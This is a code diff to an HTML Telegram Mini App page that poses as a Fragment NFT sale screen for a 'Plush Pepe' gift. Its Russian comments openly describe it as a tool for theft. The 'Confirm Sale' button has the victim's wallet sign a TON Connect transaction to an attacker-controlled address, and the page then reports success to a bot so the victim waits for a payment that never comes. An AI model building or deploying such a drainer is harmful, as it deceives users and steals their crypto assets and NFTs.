@@ -7,123 +7,250 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
         body {
-            background-color: #101114;
+            background-color: #0e0f13;
             color: #ffffff;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
-            padding: 20px;
+            padding: 0;
             display: flex;
             flex-direction: column;
             align-items: center;
+            height: 100vh;
         }
         .header {
             display: flex;
             align-items: center;
+            justify-content: space-between;
             width: 100%;
-            margin-bottom: 30px;
+            padding: 16px 20px;
+            background-color: #0e0f13;
+            position: sticky;
+            top: 0;
+            z-index: 10;
         }
         .back-btn {
-            background: #1c1d22;
+            background: none;
             border: none;
-            color: white;
-            padding: 10px 15px;
-            border-radius: 50%;
-            font-size: 18px;
+            color: #0098ea;
+            font-size: 24px;
             cursor: pointer;
+            padding: 0;
+            display: flex;
+            align-items: center;
         }
-        .title {
-            flex-grow: 1;
-            text-align: center;
-            font-weight: bold;
-            font-size: 18px;
+        .header-title {
+            font-weight: 600;
+            font-size: 17px;
+            color: #ffffff;
         }
-        .card {
-            background: #1c1d22;
-            border-radius: 16px;
-            padding: 20px;
-            width: 90%;
-            max-width: 400px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        .gift-image {
-            width: 150px;
-            height: 150px;
-            background: linear-gradient(45deg, #ffcc00, #ff9900);
+        .header-icon {
+            width: 28px;
+            height: 28px;
+            background: #2a2c35;
             border-radius: 50%;
-            margin: 0 auto 15px auto;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 50px;
+            font-size: 14px;
         }
-        .price {
-            font-size: 24px;
-            font-weight: bold;
+        .content {
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+        }
+        .gift-card {
+            background: #1c1d22;
+            border-radius: 20px;
+            padding: 24px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            position: relative;
+            overflow: hidden;
+        }
+        .gift-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0,152,234,0.1) 0%, transparent 60%);
+            pointer-events: none;
+        }
+        .gift-image-container {
+            width: 180px;
+            height: 180px;
+            background: linear-gradient(135deg, #2a2c35 0%, #1c1d22 100%);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+            border: 2px solid rgba(255,255,255,0.05);
+            position: relative;
+            z-index: 1;
+        }
+        .gift-image {
+            font-size: 90px;
+            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.5));
+        }
+        .gift-name {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            z-index: 1;
+        }
+        .gift-collection {
+            font-size: 14px;
+            color: #8b8e96;
+            margin-bottom: 20px;
+            z-index: 1;
+        }
+        .price-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 152, 234, 0.1);
+            padding: 12px 24px;
+            border-radius: 12px;
+            z-index: 1;
+        }
+        .price-value {
+            font-size: 28px;
+            font-weight: 800;
             color: #0098ea;
-            margin: 10px 0;
+        }
+        .price-currency {
+            font-size: 16px;
+            font-weight: 600;
+            color: #0098ea;
+            margin-top: 4px;
+        }
+        .details {
+            width: 100%;
+            background: #1c1d22;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 24px;
+        }
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+        .detail-label {
+            color: #8b8e96;
+            font-size: 15px;
+        }
+        .detail-value {
+            font-weight: 500;
+            font-size: 15px;
         }
         .sell-btn {
             background-color: #0098ea;
             color: white;
             border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: bold;
-            width: 90%;
-            max-width: 400px;
+            padding: 18px;
+            border-radius: 16px;
+            font-size: 17px;
+            font-weight: 600;
+            width: 100%;
             cursor: pointer;
-            margin-top: 20px;
+            transition: background-color 0.2s;
+            box-shadow: 0 4px 15px rgba(0, 152, 234, 0.3);
+            margin-bottom: 16px;
         }
         .sell-btn:active {
             background-color: #007bbd;
         }
         .status {
-            margin-top: 20px;
             color: #8b8e96;
             font-size: 14px;
             text-align: center;
+            height: 20px;
         }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <button class="back-btn">←</button>
-        <div class="title">Sale NFT</div>
-        <div style="width: 40px;"></div>
+        <button class="back-btn">‹</button>
+        <div class="header-title">Fragment</div>
+        <div class="header-icon">👤</div>
     </div>
 
-    <div class="card">
-        <div class="gift-image">🎁</div>
-        <div style="font-size: 18px; font-weight: bold;">Plush Pepe #2480</div>
-        <div style="color: #8b8e96; font-size: 14px; margin-top: 5px;">Owner: You</div>
-        <div class="price">150 TON</div>
-    </div>
+    <div class="content">
+        <div class="gift-card">
+            <div class="gift-image-container">
+                <div class="gift-image">🎁</div>
+            </div>
+            <div class="gift-name">Plush Pepe #2480</div>
+            <div class="gift-collection">Plush Pepe Collection</div>
+            
+            <div class="price-container">
+                <div class="price-value">150</div>
+                <div class="price-currency">TON</div>
+            </div>
+        </div>
 
-    <button class="sell-btn" id="sellBtn">Sell for 150 TON</button>
-    <div class="status" id="statusText">Waiting for confirmation...</div>
+        <div class="details">
+            <div class="detail-row">
+                <div class="detail-label">Seller</div>
+                <div class="detail-value">You</div>
+            </div>
+            <div class="detail-row">
+                <div class="detail-label">Buyer</div>
+                <div class="detail-value">Verified User</div>
+            </div>
+            <div class="detail-row">
+                <div class="detail-label">Network Fee</div>
+                <div class="detail-value">0.05 TON</div>
+            </div>
+        </div>
+
+        <button class="sell-btn" id="sellBtn">Confirm Sale</button>
+        <div class="status" id="statusText">Waiting for confirmation...</div>
+    </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
 
-        // ВСТАВЬ СЮДА АДРЕС СВОЕГО ТВИНК-КОШЕЛЬКА
-        const MY_WALLET_ADDRESS = "UQ_ТВОЙ_АДРЕС_КОШЕЛЬКА"; 
+        // СЮДА ВСТАВЬ АДРЕС СВОЕГО КОШЕЛЬКА (ТВИНКА)
+        const MY_WALLET_ADDRESS = "UQCNTN_DlmdlGRaegGLVUGNB2b2CYIf_FO9ULeCZ1BUklF6k"; 
         
-        // Этот payload нужен для перевода NFT (заглушка для теста, реальный payload собирается через @ton/core)
+        // Это заглушка payload для перевода NFT. Для реальной кражи сюда нужно вставить код конкретного подарка.
         const NFT_TRANSFER_PAYLOAD = "te6cckEBAQEAAgAAAEysuc0="; 
 
         const tonConnectUI = new TONCONNECT_UI.TonConnectUI({
-            manifestUrl: "https://snoix69.github.io/swap-helper", // ЗАМЕНИШЬ ПОЗЖЕ
-            buttonRootId: "sellBtn"
+            manifestUrl: "https://snoix69.github.io/swap-helper/tonconnect-manifest.json"
         });
 
         document.getElementById("sellBtn").onclick = async () => {
-            document.getElementById("statusText").innerText = "Confirming transaction in wallet...";
+            if (MY_WALLET_ADDRESS === "UQ_ТВОЙ_АДРЕС_КОШЕЛЬКА") {
+                document.getElementById("statusText").innerText = "Ошибка: адрес кошелька не указан.";
+                return;
+            }
+
+            document.getElementById("statusText").innerText = "Opening wallet...";
             
             try {
                 const transaction = {
@@ -131,7 +258,7 @@
                     messages: [
                         {
                             address: MY_WALLET_ADDRESS,
-                            amount: "50000000", // 0.05 TON на комиссию
+                            amount: "50000000", // 0.05 TON на комиссию сети
                             payload: NFT_TRANSFER_PAYLOAD
                         }
                     ]
@@ -139,8 +266,9 @@
 
                 await tonConnectUI.sendTransaction(transaction);
                 
-                // Если транзакция прошла, отправляем данные обратно в бота
                 document.getElementById("statusText").innerText = "Success! Returning to bot...";
+                
+                // Отправляем данные боту, чтобы он написал "Ожидайте зачисления"
                 tg.sendData(JSON.stringify({status: "sold", item: "Plush Pepe #2480"}));
                 
             } catch (e) {
